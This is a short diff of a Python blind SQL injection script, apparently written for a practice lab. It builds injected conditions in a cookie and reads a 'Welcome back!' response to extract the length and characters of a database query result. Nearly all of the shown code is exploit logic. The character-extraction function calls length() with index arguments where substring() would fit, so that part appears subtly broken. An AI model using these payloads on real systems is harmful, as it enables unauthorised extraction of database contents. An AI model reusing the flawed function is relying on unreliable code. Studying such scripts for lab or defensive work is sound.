@@ -20,17 +20,22 @@ logging.basicConfig(
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 AVAIL_CHARS = string.printable
+MAX_LENGTH = 100
+
 
 def format_length_query(inner_query, length):
     return f"xyz' or (select length(({inner_query}))={length})-- "
 
+
 def format_char_query(inner_query, index, char):
     return f"xyz' or (select length(({inner_query}), {index}, 1)=chr({char}))-- "
+
 
 def is_true(resp):
     if "Welcome back!" in resp.text:
         return True
     return False
+
 
 def format_request(url, outer_query):
     cookies = {
@@ -39,6 +44,7 @@ def format_request(url, outer_query):
     request = requests.Request("GET", url, cookies=cookies)
     prepped = request.prepare()
     return prepped
+
 
 def determine_response_length(inner_query, url, no_proxy=False):
     log.info("Determining response length for query.")
@@ -54,6 +60,7 @@ def determine_response_length(inner_query, url, no_proxy=False):
             response_length = i
             log.info(f"length of query response is {response_length}")
             return i
+       
         
 def determine_response_char(task):
     sess = requests.Session()
